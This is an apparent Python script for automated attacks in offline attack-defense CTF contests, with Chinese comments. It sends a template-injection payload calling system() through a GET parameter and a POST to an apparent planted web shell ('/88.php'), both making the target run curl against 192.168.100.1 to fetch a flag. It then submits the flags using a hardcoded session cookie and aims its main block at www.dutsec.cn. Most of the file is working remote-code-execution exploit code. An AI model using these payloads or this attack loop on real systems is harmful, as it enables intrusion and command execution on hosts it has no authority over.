#!/usr/bin/env python3
# Author: mark0smith
# Date: 2018/6/4
# Description: 线下赛自动攻击脚本

import requests
import re
import socket

# 设置默认超时为3秒钟
TIMEOUT = 3
socket.setdefaulttimeout(TIMEOUT)

# 设置验证flag的正则表达式
RIGHT_RE = re.compile(r"KEY{[\w]+}")


class HackOneHost:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.message = None
        self.key = None
        self.report_template = "[{status}] %s:%s {message}" % (self.host, self.port)

    def exploit_workflow(self):
        """自动化攻击流程

        """
        # 检测目标主机是否存活
        if not self.check_host_alive_with_port():
            self.reporter('x', 'Possible Down!')
            return -1

        # 开始攻击
        if self.exploit_by_get() or self.exploit_by_post():
            if self.post_right_key():
                self.reporter('+', self.message)
                return 0
            else:
                self.reporter('?', '{key} Not Submitted !'.format(key=self.key))
                return -1
        else:
            self.reporter('!', '留意大佬！')

    def reporter(self, status, message):
        print(self.report_template.format(status=status, message=message))

    def post_right_key(self):
        """用来提交正确的flag，返回的是 request 请求的返回 response """

        __post_url = "http://192.168.100.1/Title/TitleView/savecomprecord"
        __data = {
            'answer': self.key
        }
        headers = {
            'Cookie': 'PHPSESSID=elg7q85bl6eah8hapehbou32k1',
            'User-Agent': "Mozilla/5.0"
        }
        try:
            response = requests.post(__post_url, data=__data, headers=headers, timeout=TIMEOUT)

            # 根据具体情况修改这部分
            self.message = response.json()['msg']
            return True
        except Exception as e:
            print(e)
            return False

    def check_host_alive_with_port(self):
        try:
            __socket = socket.socket(socket.AF_INET)
            __address = (self.host, self.port)
            __socket.connect(__address)
            return True
        except socket.timeout:
            return False
        except Exception as e:
            print(e)
            return False

    def exploit_by_get(self):
        """这个是 GET 的请求"""

        # 修改这里的 exp_path
        exp_url_path = '/module/aciton/param1/%7B$%7Bsystem($_GET[' \
                       'x])%7D%7D?x=curl%20http://192.168.100.1/Getkey'

        # 确保路径由 / 开头
        if not exp_url_path.startswith('/'):
            exp_url_path = '/' + exp_url_path

        __url = 'http://{host}:{port}{url}'.format(
            host=self.host,
            port=self.port,
            url=exp_url_path
        )
        try:
            _req = requests.get(__url, timeout=TIMEOUT)
            _req.raise_for_status()

            # 使用正则表达式去获取 flag
            _info = RIGHT_RE.findall(_req.text)

            # 默认返回第一个符合要求的flag，可根据具体情况修改
            self.key = _info[0]
            return True

        except Exception as e:
            print(e)
            return False

    def exploit_by_post(self):
        """这个是 POST 的请求"""

        # 修改这里的 exp_path 和 post 数据包
        exp_url_path = '/88.php'
        __data = {
            'zzz': 'system("curl http://192.168.100.1/Getkey");'
        }

        # 确保路径由 / 开头
        if not exp_url_path.startswith('/'):
            exp_url_path = '/' + exp_url_path

        __url = 'http://{host}:{port}{url}'.format(
            host=self.host,
            port=self.port,
            url=exp_url_path
        )
        try:
            _req = requests.post(__url, data=__data, timeout=TIMEOUT)
            _req.raise_for_status()
            _info = RIGHT_RE.findall(_req.text)

            # 默认返回第一个符合要求的flag
            self.key = _info[0]
            return True

        except Exception as e:
            print(e)
            return False


if __name__ == '__main__':
    a = HackOneHost('www.dutsec.cn', 80)
    a.exploit_workflow()

